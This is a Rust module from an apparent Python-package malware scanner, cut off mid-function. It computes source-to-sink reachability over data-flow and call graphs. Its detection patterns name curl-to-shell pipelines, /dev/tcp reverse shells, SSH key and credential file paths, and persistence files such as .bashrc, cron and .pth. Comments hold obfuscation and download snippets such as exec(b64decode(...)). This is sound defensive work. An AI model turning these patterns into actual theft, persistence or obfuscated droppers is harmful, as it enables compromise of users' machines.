//! Source→sink reachability: the decision predicate of the whole analyser
//! (invariant 3; DECISIONS.md, ADR-008 and ADR-009).
//!
//! Two kinds of query, both returning `ReachabilityPath`s:
//! - `data_paths`: a path in the data-flow graph from a source's result node to a sink's
//!   argument node;
//! - `control_paths`: a path in the call graph from a phase root to the definition that
//!   contains a sink call.
//!
//! Determinism: sources, sinks and the resulting paths are produced in canonical order
//! (file, then span), and for each (source, sink) pair the *shortest* path is chosen
//! (BFS), ties broken by node index. Two scans of the same bytes yield identical paths.

use std::collections::{BTreeSet, VecDeque};

use petgraph::Direction;
use petgraph::graph::{EdgeIndex, NodeIndex};
use petgraph::visit::EdgeRef;
use phylaxis_core::{
    Confidence, FileId, FlowEdge, FlowEdgeKind, FlowNode, FlowNodeKind, Location, PackageGraph,
    PathStep, PathStepKind, PhaseRoot, QualifiedName, ReachabilityKind, ReachabilityPath, Span,
    SymbolKind, TaintSink, TaintSinkKind, TaintSource, TaintSourceKind,
};

/// A catalogue source pattern: a kind plus a canonical dotted-name prefix (for calls) or
/// a path prefix (for `SensitiveFile`, matched against string literals passed to file
/// APIs). Defined here, below the rules crate, so that both crates share one type.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SourcePattern {
    pub kind: TaintSourceKind,
    pub pattern: &'static str,
}

/// A catalogue sink pattern: a kind plus a canonical dotted-name prefix, and which
/// argument position carries the dangerous value (`None` = any argument or the receiver).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SinkPattern {
    pub kind: TaintSinkKind,
    pub pattern: &'static str,
    pub arg: Option<usize>,
}

/// Search bounds. WHY bounded: a hostile package can contain a pathological graph; the
/// scan must finish, and a truncated search is recorded, not hidden.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ReachLimits {
    pub max_depth: usize,
    pub max_paths_per_pair: usize,
}

impl Default for ReachLimits {
    fn default() -> Self {
        Self {
            max_depth: 64,
            max_paths_per_pair: 1,
        }
    }
}

/// Finds every occurrence of the given source patterns in the package graph, in canonical
/// order (file, then span, then node index).
///
/// - Name-based kinds (`Environment`, `SystemIdentity`, `UserInput`, `NetworkResponse`)
///   match a `CallResult` whose canonical callee `is_under` the pattern (`os.getenv(…)`),
///   or a read of an imported name under it (`os.environ` in `os.environ['T']`). A read
///   only counts when nothing flows into its node: that is what an external read looks like
///   in this graph, and it keeps `os.environ['T']` — a `Container` step fed by the read —
///   from being counted a second time.
/// - `PhaseRoot` yields one source per root in `pg.phases.roots`; its `node` is the root's
///   **call-graph** node, which is why `data_paths` skips it.
/// - `SensitiveFile` and `SuspiciousLiteral` match a `Literal` node on its value (the label
///   is the unquoted string): a path under the pattern for the first, a shape named by the
///   pattern for the second (see [`literal_matches`]).
/// - `DecodedLiteral` matches the result of a call to a [`DECODERS`] entry whose input is
///   constant: every node that flows into it, traced back, starts at a literal (see
///   [`is_decoded_constant`]). Matched in the data-flow graph rather than by
///   [`crate::fold::fold_literal`], because the payload almost always passes through a
///   variable first (`_BLOB = "…"; exec(b64decode(_BLOB))`) and folding sees one expression
///   at a time. The callee label is canonical, so `import base64 as b` is resolved here.
pub fn find_sources(pg: &PackageGraph, patterns: &[SourcePattern]) -> Vec<TaintSource> {
    let d = &pg.dfg.graph;
    let mut out = Vec::new();
    for p in patterns {
        match p.kind {
            TaintSourceKind::PhaseRoot => {
                for root in &pg.phases.roots {
                    let (Some(node), Some(sym)) = (
                        pg.call_graph.node_of(root.symbol),
                        pg.symbols.get(root.symbol),
                    ) else {
                        continue;
                    };
                    out.push(TaintSource {
                        kind: p.kind,
                        pattern: QualifiedName::new(p.pattern),
                        location: location(pg, root.file, sym.defined_at.unwrap_or_default()),
                        node,
                    });
                }
            }
            TaintSourceKind::SensitiveFile | TaintSourceKind::SuspiciousLiteral => {
                for i in d.node_indices() {
                    let n = &d[i];
                    if n.kind == FlowNodeKind::Literal
                        && literal_matches(p, &n.label)
                        && !(p.pattern == "<literal:home-or-root-path>" && only_a_separator(d, i))
                    {
                        out.push(TaintSource {
                            kind: p.kind,
                            pattern: QualifiedName::new(p.pattern),
                            location: location(pg, n.file, n.span),
                            node: i,
                        });
                    }
                }
            }
            TaintSourceKind::DecodedLiteral => {
                for i in d.node_indices() {
                    let n = &d[i];
                    let decoder = n.kind == FlowNodeKind::CallResult
                        && DECODERS
                            .iter()
                            .any(|dec| QualifiedName::new(n.label.as_str()).is_under(dec));
                    if decoder && is_decoded_constant(pg, i) {
                        out.push(TaintSource {
                            kind: p.kind,
                            pattern: QualifiedName::new(n.label.as_str()),
                            location: location(pg, n.file, n.span),
                            node: i,
                        });
                    } else if n.kind == FlowNodeKind::Literal && escape_encoded(&n.label) {
                        // The lexer is the decoder (ADR-028): `"\145\166\141\154"` is `eval`.
                        out.push(TaintSource {
                            kind: p.kind,
                            pattern: QualifiedName::new("<escaped-literal>"),
                            location: location(pg, n.file, n.span),
                            node: i,
                        });
                    }
                }
            }
            _ => {
                for i in d.node_indices() {
                    let n = &d[i];
                    let matches = match n.kind {
                        FlowNodeKind::CallResult => true,
                        FlowNodeKind::Use => d
                            .neighbors_directed(i, Direction::Incoming)
                            .next()
                            .is_none(),
                        _ => false,
                    } && QualifiedName::new(n.label.as_str()).is_under(p.pattern);
                    if matches {
                        out.push(TaintSource {
                            kind: p.kind,
                            pattern: QualifiedName::new(p.pattern),
                            location: location(pg, n.file, n.span),
                            node: i,
                        });
                    }
                }
            }
        }
    }
    out.sort_by(|a, b| (&a.location, a.node, a.kind).cmp(&(&b.location, b.node, b.kind)));
    out.dedup_by(|a, b| a.node == b.node && a.kind == b.kind);
    out
}

/// The decoders whose result, applied to a constant, is a `DecodedLiteral`: ADR-018's list
/// minus the entries that are not decoders (`join`, reversal and re-encoding hide nothing
/// from a reader). Canonical names, matched with `is_under`.
///
/// `chr` is one (ADR-028): `[101, 120, 101, 99]` hides `exec` from a reader as well as any
/// base64 does, and it is how the commonest PyPI obfuscators spell their entry point.
pub const DECODERS: &[&str] = &[
    "chr",
    "base64.b64decode",
    "base64.standard_b64decode",
    "base64.urlsafe_b64decode",
    "base64.b32decode",
    "base64.b16decode",
    "base64.b85decode",
    "base64.a85decode",
    "base64.decodebytes",
    "binascii.unhexlify",
    "binascii.a2b_base64",
    "binascii.a2b_hex",
    "bytes.fromhex",
    "codecs.decode",
    "zlib.decompress",
    "gzip.decompress",
    "bz2.decompress",
    "lzma.decompress",
];

/// How many nodes [`is_decoded_constant`] visits before giving up. The walk goes backwards
/// over an attacker-written graph, so it is bounded like every other search here; giving up
/// answers "not constant", which misses a source rather than inventing one.
const MAX_CONSTANT_WALK: usize = 4096;

/// Whether everything that flows into `node` starts at a constant. Walks incoming edges
/// back to the nodes nothing flows into, and requires each of them to be a `Literal`, or a
/// `Definition` bound to a value that produced no node at all (`_CODES = [99, 72, …]`:
/// numbers have no data-flow node, so the binding is a leaf). Any other leaf — a call
/// result, an external read, a parameter nobody passes — is data from outside, and a
/// decoder applied to it is a dropper's shape, not an obfuscated literal.
fn is_decoded_constant(pg: &PackageGraph, node: NodeIndex) -> bool {
    let d = &pg.dfg.graph;
    let mut seen = BTreeSet::from([node]);
    let mut stack = vec![node];
    let mut leaves = 0usize;
    while let Some(n) = stack.pop() {
        let inputs: Vec<NodeIndex> = d.neighbors_directed(n, Direction::Incoming).collect();
        if inputs.is_empty() {
            let constant =
                n != node && matches!(d[n].kind, FlowNodeKind::Literal | FlowNodeKind::Definition);
            if !constant {
                return false;
            }
            leaves += 1;
            continue;
        }
        for i in inputs {
            if seen.insert(i) {
                if seen.len() > MAX_CONSTANT_WALK {
                    return false;
                }
                stack.push(i);
            }
        }
    }
    leaves > 0
}

/// Whether a string literal matches a `SensitiveFile` or `SuspiciousLiteral` pattern.
///
/// `SensitiveFile` patterns are paths. A home-relative pattern (`~/.ssh`) matches a literal
/// that, after `\` becomes `/` and a leading `~/`, `$HOME/` or `%USERPROFILE%/` is dropped,
/// is the pattern's path or lies under it. Dropping the prefix is deliberate: the home
/// directory is usually computed (`os.path.join(Path.home(), ".ssh/id_rsa")`), so the
/// literal starts at `.ssh`. An absolute or bare pattern (`/etc/passwd`, `.env`) matches the
/// literal itself or a path ending in it.
///
/// `SuspiciousLiteral` patterns name a shape: `<literal:url-not-index>`,
/// `<literal:raw-ip>`, `<literal:shell-pipeline>`, `<literal:wallet-address>`,
/// `<literal:home-or-root-path>`.
pub fn literal_matches(pattern: &SourcePattern, value: &str) -> bool {
    match pattern.kind {
        TaintSourceKind::SensitiveFile => sensitive_path(pattern.pattern, value),
        TaintSourceKind::SuspiciousLiteral => match pattern.pattern {
            "<literal:url-not-index>" => url_not_index(value),
            "<literal:command-with-url>" => command_with_url(value),
            "<literal:raw-ip>" => raw_ip(value),
            "<literal:shell-pipeline>" => shell_pipeline(value),
            "<literal:wallet-address>" => wallet_address(value),
            "<literal:home-or-root-path>" => home_or_root(value),
            _ => false,
        },
        _ => false,
    }
}

/// The hosts a URL literal may name without being suspicious. The matcher lives here, so
/// the list does too; the rules crate re-exports it.
pub const OFFICIAL_INDEX_HOSTS: &[&str] = &["pypi.org", "files.pythonhosted.org", "test.pypi.org"];

fn normalised(value: &str) -> String {
    value.trim().replace('\\', "/")
}

fn under(path: &str, prefix: &str) -> bool {
    !prefix.is_empty()
        && path
            .strip_prefix(prefix)
            .is_some_and(|rest| rest.is_empty() || rest.starts_with('/'))
}

/// What a file path was built from: the string literals and the external names (calls and
/// imported reads) that flow into an `open(…)` call.
#[derive(Debug, Default)]
struct PathParts {
    literals: Vec<String>,
    names: Vec<String>,
}

/// How far the walk back from `open(…)` goes. A path is built in a handful of steps; the
/// bound only stops an attacker-written graph from making sink matching expensive.
const MAX_PATH_PARTS_NODES: usize = 256;

/// Walks the data-flow graph backwards from an `open(…)` call and collects its parts.
///
/// WHY the write-back edges are skipped: a write into a handle defines the opened path's
/// variable (ADR-006), and reads are flow-insensitive, so walking back from `open(target)`
/// would otherwise also collect whatever was *written* to `target`. The content is not the
/// location; a downloaded URL ending in `/.bashrc` must not make the file look like one.
fn path_parts(d: &petgraph::Graph<FlowNode, FlowEdge>, open: NodeIndex) -> PathParts {
    let mut parts = PathParts::default();
    let mut seen = BTreeSet::from([open]);
    let mut queue = VecDeque::from([open]);
    while let Some(i) = queue.pop_front() {
        let n = &d[i];
        match n.kind {
            FlowNodeKind::Literal => parts.literals.push(n.label.clone()),
            FlowNodeKind::CallResult | FlowNodeKind::Use if i != open => {
                parts.names.push(n.label.clone())
            }
            _ => {}
        }
        for e in d.edges_directed(i, Direction::Incoming) {
            let write_back = n.kind == FlowNodeKind::Definition
                && matches!(&e.weight().kind, FlowEdgeKind::Transform { callee, .. } if callee.as_str() == "open");
            if write_back || seen.len() >= MAX_PATH_PARTS_NODES {
                continue;
            }
            if seen.insert(e.source()) {
                queue.push_back(e.source());
            }
        }
    }
    parts
}

/// Calls and names that yield a site-packages directory.
const SITE_DIRS: &[&str] = &[
    "site.getsitepackages",
    "site.getusersitepackages",
    "site.USER_SITE",
    "sysconfig.get_path",
    "sysconfig.get_paths",
    "distutils.sysconfig.get_python_lib",
];

/// Whether a file built from `parts` is the persistence location named by a `<write:…>`
/// pattern.
///
/// - `site-packages/*.pth`: a literal ending in `.pth` and a site directory, from a
///   [`SITE_DIRS`] call or a literal naming `site-packages` / `dist-packages`.
/// - An absolute pattern (`/etc/cron`) is a prefix of some literal, so `/etc/cron.d/job` and
///   `/etc/crontab` both match.
/// - A home-relative or bare pattern (`~/.bashrc`, `sitecustomize.py`) matches a literal that,
///   with a leading home prefix dropped, is the path, lies under it, or ends with it. The
///   home directory is usually computed, so `os.path.join(Path.home(), ".bashrc")` has
///   `.bashrc` as its literal.
///
/// Parts of a path joined from several literals (`".config"`, `"autostart"`) are not joined
/// back together; such a location is missed, not misnamed.
fn written_location_matches(pattern: &str, parts: &PathParts) -> bool {
    if pattern == "site-packages/*.pth" {
        let pth = parts
            .literals
            .iter()
            .any(|l| normalised(l).ends_with(".pth"));
        let site = parts.names.iter().any(|n| {
            SITE_DIRS
                .iter()
                .any(|s| QualifiedName::new(n.as_str()).is_under(s))
        }) || parts.literals.iter().any(|l| {
            let v = normalised(l);
            v.contains("site-packages") || v.contains("dist-packages")
        });
        return pth && site;
    }
    parts.literals.iter().any(|l| {
        let v = normalised(l);
        if pattern.starts_with('/') {
            return v.starts_with(pattern);
        }
        let relative = pattern.strip_prefix("~/").unwrap_or(pattern);
        let rest = ["~/", "$HOME/", "${HOME}/", "%USERPROFILE%/"]
            .iter()
            .find_map(|prefix| v.strip_prefix(prefix))
            .unwrap_or(&v);
        under(rest, relative)
            || rest.ends_with(&format!("/{relative}"))
            || rest.contains(&format!("/{relative}/"))
    })
}

fn sensitive_path(pattern: &str, value: &str) -> bool {
    let v = normalised(value);
    match pattern.strip_prefix("~/") {
        Some(relative) => {
            let rest = ["~/", "$HOME/", "${HOME}/", "%USERPROFILE%/"]
                .iter()
                .find_map(|prefix| v.strip_prefix(prefix))
                .unwrap_or(&v);
            under(rest, relative)
        }
        None => under(&v, pattern) || v.ends_with(&format!("/{pattern}")),
    }
}

/// Fewest escape-encoded printable characters that make a literal "encoded" (ADR-028).
const MIN_ESCAPED_PRINTABLE: usize = 4;

/// Whether a string literal, as written, spells printable ASCII in escape sequences
/// (`\xHH`, `\ooo`, `\uHHHH`) for at least half of its characters. Labels keep escapes as
/// written (`symbols::str_literal`), so this reads the source spelling. Non-printable
/// escapes (`\x1b`, `\n`, `\x00`) are how control bytes and binary data are written and do
/// not count: a printable character has no reason to be escaped except to hide it.
pub(crate) fn escape_encoded(value: &str) -> bool {
    let b = value.as_bytes();
    let code = |digits: &[u8], radix: u32| {
        std::str::from_utf8(digits)
            .ok()
            .and_then(|t| u32::from_str_radix(t, radix).ok())
    };
    let (mut escaped, mut chars, mut i) = (0usize, 0usize, 0usize);
    while i < b.len() {
        chars += 1;
        if b[i] != b'\\' || i + 1 >= b.len() {
            i += 1;
            continue;
        }
        let (value, width) = match b[i + 1] {
            b'x' if i + 4 <= b.len() => (code(&b[i + 2..i + 4], 16), 4),
            b'u' if i + 6 <= b.len() => (code(&b[i + 2..i + 6], 16), 6),
            b'0'..=b'7' => {
                let end = (i + 2..(i + 4).min(b.len()))
                    .find(|&j| !(b'0'..=b'7').contains(&b[j]))
                    .unwrap_or((i + 4).min(b.len()));
                (code(&b[i + 1..end], 8), end - i)
            }
            _ => (None, 2),
        };
        if value.is_some_and(|c| (0x20..0x7f).contains(&c)) {
            escaped += 1;
        }
        i += width;
    }
    escaped >= MIN_ESCAPED_PRINTABLE && escaped * 2 >= chars
}

/// A whole literal that is a URL, not a template of one. A value with `{…}` holes
/// (`https://github.com/{}/{}/pull/{}`, an f-string's text or a `.format` pattern) is a link
/// being filled in, and matches only inside a command (`command_with_url`, ADR-028): seen on
/// the development set, where libc's maintenance script hands such templates to `git`.
fn url_not_index(value: &str) -> bool {
    let v = value.trim();
    if v.contains('{') {
        return false;
    }
    let Some(rest) = ["http://", "https://", "ftp://"]
        .iter()
        .find_map(|scheme| v.strip_prefix(scheme))
    else {
        return false;
    };
    let authority = rest.split(['/', '?', '#']).next().unwrap_or_default();
    let host_port = authority.rsplit('@').next().unwrap_or_default();
    let host = host_port
        .split(':')
        .next()
        .unwrap_or_default()
        .to_ascii_lowercase();
    !host.is_empty() && !OFFICIAL_INDEX_HOSTS.contains(&host.as_str())
}

/// A command line with a non-index URL among its words: `curl.exe -L https://h/a.exe -o x`
/// (ADR-028). `url_not_index` needs the whole literal to be the URL, which a download
/// command never is. Words are split on whitespace and stripped of quotes, so an f-string
/// template's `"{}"` placeholders do not hide a neighbouring URL.
fn command_with_url(value: &str) -> bool {
    let words: Vec<&str> = value.split_whitespace().collect();
    words.len() >= 2
        && words
            .iter()
            .any(|w| url_not_index(w.trim_matches(|c| matches!(c, '"' | '\'' | '`'))))
}

fn raw_ip(value: &str) -> bool {
    let v = value.trim();
    let host = match v.rsplit_once(':') {
        Some((h, port)) if !port.is_empty() && port.chars().all(|c| c.is_ascii_digit()) => h,
        _ => v,
    };
    let parts: Vec<&str> = host.split('.').collect();
    parts.len() == 4
        && parts
            .iter()
            .all(|p| !p.is_empty() && p.len() <= 3 && p.parse::<u8>().is_ok())
        // Loopback and the unspecified address are how local servers are written.
        && !host.starts_with("127.")
        && host != "0.0.0.0"
}

fn shell_pipeline(value: &str) -> bool {
    let v = value.to_ascii_lowercase();
    let fetches = v.contains("curl ") || v.contains("wget ");
    let piped_to_shell = v.split('|').skip(1).any(|segment| {
        let program = segment.split_whitespace().next().unwrap_or_default();
        let program = program.rsplit('/').next().unwrap_or_default();
        matches!(program, "sh" | "bash" | "zsh" | "python" | "python3")
    });
    (fetches && piped_to_shell) || v.contains("/dev/tcp/")
}

fn wallet_address(value: &str) -> bool {
    let v = value.trim();
    let base58 = |s: &str| {
        s.chars()
            .all(|c| c.is_ascii_alphanumeric() && !matches!(c, '0' | 'O' | 'I' | 'l'))
    };
    let bitcoin =
        (v.starts_with('1') || v.starts_with('3')) && (26..=35).contains(&v.len()) && base58(v);
    let bech32 = v.len() >= 14
        && v.len() <= 74
        && v.starts_with("bc1")
        && v[3..]
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit());
    let ethereum =
        v.len() == 42 && v.starts_with("0x") && v[2..].chars().all(|c| c.is_ascii_hexdigit());
    bitcoin || bech32 || ethereum
}

/// String methods in which a literal is a separator or an affix, not a path:
/// `x.replace("/", "\\")`, `s.split("/")`, `"/".join(parts)`, `p.rstrip("/")`.
const SEPARATOR_METHODS: &[&str] = &[
    "replace",
    "split",
    "rsplit",
    "join",
    "strip",
    "lstrip",
    "rstrip",
    "startswith",
    "endswith",
    "partition",
    "rpartition",
    "count",
    "find",
    "rfind",
    "index",
    "rindex",
    "removeprefix",
    "removesuffix",
];

/// Whether every use of the literal at `node` is as a separator or affix of a string
/// method, so that it never stands for a directory (ADR-024).
///
/// WHY: `<literal:home-or-root-path>` accepts `"/"`, and `"/"` or `"\\"` alone are far more
/// often separators than the root directory. The first development-set run flagged two
/// popular benign packages as Malicious on nothing but `path.replace("/", "\\")` reaching
/// `subprocess`. A literal with no uses at all is kept: there is nothing to exempt it on.
/// Path functions are never separator uses, even when named like one: `os.path.join("/",
/// d)` builds a path from the root.
fn only_a_separator(d: &petgraph::Graph<FlowNode, FlowEdge>, node: NodeIndex) -> bool {
    let separator_call = |callee: &str| {
        let method = callee.rsplit('.').next().unwrap_or(callee);
        let path_api = ["os.path", "pathlib", "posixpath", "ntpath"]
            .iter()
            .any(|p| QualifiedName::new(callee).is_under(p));
        !path_api && SEPARATOR_METHODS.contains(&method)
    };
    let mut uses = d.edges_directed(node, Direction::Outgoing).peekable();
    uses.peek().is_some()
        && uses.all(|e| match &e.weight().kind {
            // A taint-preserving method (`replace`, `split`, `join`): the callee is on the edge.
            FlowEdgeKind::Transform { callee, .. } => separator_call(callee.as_str()),
            // Any other method (`startswith`, `find`): the argument enters the callee's
            // parameter node, which carries the callee's name.
            FlowEdgeKind::Argument => {
                let to = &d[e.target()];
                to.kind == FlowNodeKind::Parameter && separator_call(&to.label)
            }
            _ => false,
        })
}

fn home_or_root(value: &str) -> bool {
    let v = normalised(value);
    if v.is_empty() {
        return false;
    }
    let trimmed = v.trim_end_matches('/');
    let drive =
        trimmed.len() == 2 && trimmed.ends_with(':') && trimmed.as_bytes()[0].is_ascii_alphabetic();
    drive
        || matches!(
            trimmed,
            "" | "~" | "$HOME" | "${HOME}" | "%USERPROFILE%" | "/home" | "/root" | "/Users"
        )
}

/// Finds every sink occurrence, in canonical order: a call whose canonical callee
/// `is_under` a pattern.
///
/// The returned `node` is the call's **external-parameter node** — the one `Parameter`
/// node the data-flow builder gives every call to a non-preserving external, into which
/// all of the call's arguments and its receiver flow (see `dataflow::build_data_flow`).
/// `definition` is the call-graph node of the definition containing the call.
///
/// `SinkPattern::arg` is not yet honoured: every argument counts. That errs toward a
/// finding, as ADR-007 asks of the graph; narrowing it needs one parameter node per
/// argument position.
pub fn find_sinks(pg: &PackageGraph, patterns: &[SinkPattern]) -> Vec<TaintSink> {
    let d = &pg.dfg.graph;
    let mut out = Vec::new();
    for i in d.node_indices() {
        let n = &d[i];
        if n.kind != FlowNodeKind::Parameter {
            continue;
        }
        // A package function's parameters carry no symbol; only the external stand-ins do.
        let Some(callee) = n.symbol.and_then(|s| pg.symbols.get(s)) else {
            continue;
        };
        if callee.kind != SymbolKind::External {
            continue;
        }
        let Some(definition) = pg.call_graph.node_of(n.owner) else {
            continue;
        };
        for p in patterns
            .iter()
            .filter(|p| callee.qualified.is_under(p.pattern))
        {
            out.push(TaintSink {
                kind: p.kind,
                pattern: QualifiedName::new(p.pattern),
                location: location(pg, n.file, n.span),
                node: i,
                definition,
            });
        }
    }
    // `<write:LOCATION>`: a write into a handle opened on that location. The sink node is
    // the write itself, so a path ends where the bytes land.
    let write_patterns: Vec<(&SinkPattern, &str)> = patterns
        .iter()
        .filter_map(|p| Some((p, p.pattern.strip_prefix("<write:")?.strip_suffix('>')?)))
        .collect();
    if !write_patterns.is_empty() {
        for &(write, open) in &pg.dfg.file_writes {
            let n = &d[write];
            let Some(definition) = pg.call_graph.node_of(n.owner) else {
                continue;
            };
            let parts = path_parts(d, open);
            for (p, location_pattern) in &write_patterns {
                if written_location_matches(location_pattern, &parts) {
                    out.push(TaintSink {
                        kind: p.kind,
                        pattern: QualifiedName::new(p.pattern),
                        location: location(pg, n.file, n.span),
                        node: write,
                        definition,
                    });
                }
            }
        }
    }
    out.sort_by(|a, b| (&a.location, a.node, a.kind).cmp(&(&b.location, b.node, b.kind)));
    out.dedup_by(|a, b| a.node == b.node && a.kind == b.kind);
    out
}

/// Data reachability. For each (source, sink) pair in canonical order, the shortest path
/// in the DFG from `source.node` to `sink.node` of at most `limits.max_depth` edges. Each
/// path's `confidence` is the minimum edge confidence, and `obfuscated` is set if any
/// `Transform { obfuscating: true }` edge was crossed.
///
/// `conditional` is always `false` for now: deciding it needs the syntax around the sink
/// (`if platform.system() == …`), which the package graph does not carry. It is a severity
/// attribute, not part of the predicate, so its absence moves no path in or out.
///
/// At most one path per pair is emitted, whatever `max_paths_per_pair` says.
pub fn data_paths(
    pg: &PackageGraph,
    sources: &[TaintSource],
    sinks: &[TaintSink],
    limits: &ReachLimits,
) -> Vec<ReachabilityPath> {
    data_paths_to(pg, sources, sinks, limits)
        .into_iter()
        .map(|(path, _)| path)
        .collect()
}

/// [`data_paths`], with each path paired with the index in `sinks` of the sink it ends at.
/// The rule engine needs that pairing to read the sink's phase; asking for it here lets it
/// run one search per source for all its sinks, instead of one per (source, sink).
pub fn data_paths_to(
    pg: &PackageGraph,
    sources: &[TaintSource],
    sinks: &[TaintSink],
    limits: &ReachLimits,
) -> Vec<(ReachabilityPath, usize)> {
    // Breadth-first search from each source, keeping for every reached node the edge it was
    // first reached by (`parent`). Walking `parent` back from a sink gives the path. BFS
    // reaches each node first along a path with the fewest edges, so that path is the
    // shortest one, and ties are broken by visiting out-edges in target-index order — which
    // makes the choice a function of the graph alone (ADR-004).
    //
    // WHY one path and not all of them: the number of simple paths between two nodes grows
    // exponentially with the graph (a chain of n diamonds has 2^n), and the graph is
    // written by the attacker. The rule needs to know that *a* path exists, and the auditor
    // needs one readable path to confirm or refute it; the shortest is the most readable.
    //
    // WHY the search is pruned to `live` nodes, those from which some sink is reachable:
    // without it every source explores the whole graph, and a large package has thousands
    // of sources and millions of nodes. The pruning changes no path. Every node on a path
    // to a sink is live, and a dead node has no edge into a live one (it would be live
    // itself), so live nodes are discovered by live nodes only: in the same order, at the
    // same depth, from the same parent as in the unpruned search.
    let d = &pg.dfg.graph;
    let mut out = Vec::new();
    if limits.max_paths_per_pair == 0 || sinks.is_empty() {
        return out;
    }
    let live = can_reach(d.node_count(), sinks.iter().map(|s| s.node), |n| {
        d.edges_directed(n, Direction::Incoming)
            .map(|e| e.source())
            .collect()
    });
    for source in sources {
        if source.kind == TaintSourceKind::PhaseRoot
            || d.node_weight(source.node).is_none()
            || !live[source.node.index()]
        {
            continue;
        }
        let parent = bfs(d.node_count(), source.node, limits.max_depth, |n| {
            let mut next: Vec<(NodeIndex, EdgeIndex)> = d
                .edges_directed(n, Direction::Outgoing)
                .filter(|e| live[e.target().index()])
                .map(|e| (e.target(), e.id()))
                .collect();
            next.sort();
            next
        });
        for (i, sink) in sinks.iter().enumerate() {
            let Some(edges) = walk_back(&parent, source.node, sink.node, |e| {
                d.edge_endpoints(e).map(|(from, _)| from)
            }) else {
                continue;
            };
            out.push((data_path(pg, source, sink, &edges), i));
        }
    }
    out
}

/// Every node from which one of `goals` is reachable, as a flag per node index: a
/// traversal from the goals along `prev` (the reversed edges).
fn can_reach(
    nodes: usize,
    goals: impl Iterator<Item = NodeIndex>,
    prev: impl Fn(NodeIndex) -> Vec<NodeIndex>,
) -> Vec<bool> {
    let mut live = vec![false; nodes];
    let mut stack = Vec::new();
    for g in goals {
        if g.index() < nodes && !live[g.index()] {
            live[g.index()] = true;
            stack.push(g);
        }
    }
    while let Some(n) = stack.pop() {
        for p in prev(n) {
            if !live[p.index()] {
                live[p.index()] = true;
                stack.push(p);
            }
        }
    }
    live
}

/// Control reachability. BFS in the call graph from `root.symbol`'s node to each sink's
/// `definition` node; the path's steps are `Source` (the root), one `Call` per edge, then
/// `Sink` (the sink call itself). Confidence is the minimum call-edge confidence.
pub fn control_paths(
    pg: &PackageGraph,
    root: &PhaseRoot,
    sinks: &[TaintSink],
    limits: &ReachLimits,
) -> Vec<ReachabilityPath> {
    let cg = &pg.call_graph.graph;
    let mut out = Vec::new();
    let Some(start) = pg.call_graph.node_of(root.symbol) else {
        return out;
    };
    if limits.max_paths_per_pair == 0 {
        return out;
    }
    let parent = bfs(cg.node_count(), start, limits.max_depth, |n| {
        let mut next: Vec<(NodeIndex, EdgeIndex)> = cg
            .edges_directed(n, Direction::Outgoing)
            .map(|e| (e.target(), e.id()))
            .collect();
        next.sort();
        next
    });
    let root_span = pg
        .symbols
        .get(root.symbol)
        .and_then(|s| s.defined_at)
        .unwrap_or_default();
    for sink in sinks {
        let Some(edges) = walk_back(&parent, start, sink.definition, |e| {
            cg.edge_endpoints(e).map(|(from, _)| from)
        }) else {
            continue;
        };
        let mut steps = vec![PathStep {
            kind: PathStepKind::Source,
            location: location(pg, root.file, root_span),
            symbol: cg[start].name.to_string(),
            detail: Some(format!("{:?} root", root.phase)),
        }];
        let mut confidence = Confidence::Resolved;
        for e in &edges {
            let w = &cg[*e];
            let (_, to) = cg.edge_endpoints(*e).expect("edge from this graph");
            confidence = confidence.min(w.confidence);
            steps.push(PathStep {
                kind: PathStepKind::Call,
                location: location(pg, w.file, w.site),
                symbol: cg[to].name.to_string(),
                detail: None,
            });
        }
        steps.push(PathStep {
            kind: PathStepKind::Sink,
            location: sink.location.clone(),
            symbol: sink.pattern.to_string(),
            detail: None,
        });
        out.push(ReachabilityPath {
            kind: ReachabilityKind::Control,
            steps,
            confidence,
            obfuscated: false,
            conditional: false,
        });
    }
    out
}

/// Breadth-first search from `start`, at most `max_depth` edges deep. Returns, per node
/// index, the edge that node was first reached by (`None` for `start` and for nodes not
/// reached). A flat vector rather than a map: a search visits up to millions of nodes.
fn bfs(
    nodes: usize,
    start: NodeIndex,
    max_depth: usize,
    mut next: impl FnMut(NodeIndex) -> Vec<(NodeIndex, EdgeIndex)>,
) -> Vec<Option<EdgeIndex>> {
    let mut parent = vec![None; nodes];
    let mut seen = vec![false; nodes];
    if start.index() >= nodes {
        return parent;
    }
    seen[start.index()] = true;
    let mut frontier = VecDeque::from([(start, 0usize)]);
    while let Some((node, depth)) = frontier.pop_front() {
        if depth == max_depth {
            continue;
        }
        for (to, edge) in next(node) {
            if !seen[to.index()] {
                seen[to.index()] = true;
                parent[to.index()] = Some(edge);
                frontier.push_back((to, depth + 1));
            }
        }
    }
    parent
}

/// The edges from `start` to `goal`, in order, if the search reached `goal`. A `goal`
/// equal to `start` is a path of no edges.
fn walk_back(
    parent: &[Option<EdgeIndex>],
    start: NodeIndex,
    goal: NodeIndex,
    source_of: impl Fn(EdgeIndex) -> Option<NodeIndex>,
) -> Option<Vec<EdgeIndex>> {
    let mut edges = Vec::new();
    let mut at = goal;
    while at != start {
        let e = (*parent.get(at.index())?)?;
        edges.push(e);
        at = source_of(e)?;
    }
    edges.reverse();
    Some(edges)
}

/// Turns the edges of a data path into typed steps (ADR-009).
fn data_path(
    pg: &PackageGraph,
    source: &TaintSource,
    sink: &TaintSink,
    edges: &[EdgeIndex],
) -> ReachabilityPath {
    let d = &pg.dfg.graph;
    let first = &d[source.node];
    let mut steps = vec![PathStep {
        kind: PathStepKind::Source,
        location: source.location.clone(),
        symbol: first.label.clone(),
        detail: Some(source.pattern.to_string()),
    }];
    let mut confidence = Confidence::Resolved;
    // A decoded constant is obfuscated by definition, whether or not a further encoder is
    // crossed on the way to the sink.
    let mut obfuscated = source.kind == TaintSourceKind::DecodedLiteral;
    for e in edges {
        let w = &d[*e];
        let (_, to) = d.edge_endpoints(*e).expect("edge from this graph");
        confidence = confidence.min(w.confidence);
        let (kind, detail) = match &w.kind {
            FlowEdgeKind::Assign | FlowEdgeKind::Container | FlowEdgeKind::Attribute => {
                (PathStepKind::Transfer, None)
            }
            FlowEdgeKind::Argument => (PathStepKind::Call, None),
            FlowEdgeKind::Return => (PathStepKind::Return, None),
            FlowEdgeKind::Transform {
                callee,
                obfuscating,
            } => {
                obfuscated |= *obfuscating;
                (PathStepKind::Transform, Some(callee.to_string()))
            }
        };
        let n = &d[to];
        steps.push(PathStep {
            kind,
            location: location(pg, n.file, n.span),
            symbol: n.label.clone(),
            detail,
        });
